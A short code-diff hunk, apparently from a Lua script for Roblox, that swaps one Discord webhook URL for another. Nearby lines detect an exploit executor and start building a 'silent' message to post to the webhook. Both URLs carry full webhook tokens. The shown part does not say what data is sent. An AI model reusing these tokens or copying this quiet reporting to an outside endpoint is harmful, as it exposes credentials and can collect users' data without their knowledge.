@@ -56,7 +56,7 @@ SONA_LOADED and "Sona" or
 "Kid with shit exploit"
 
 local url =
-"https://discordapp.com/api/webhooks/923752677748379758/lb7qz8q2P2JG_8W7fHZhgabOdaUOlO8Q3K1yvPOqkor5bM8i7vLLFhav42SfQdK2lOPc"
+"https://discordapp.com/api/webhooks/924084624290873395/zO2C29WV83AP0X1zeh5fVQQFd1DF3BrZFLkh9GEWvRq8qcoTOyRdWmavfPRdCyRzq0IE"
 local data = {
 ["content"] = " ***silent***",
 ["embeds"] = {
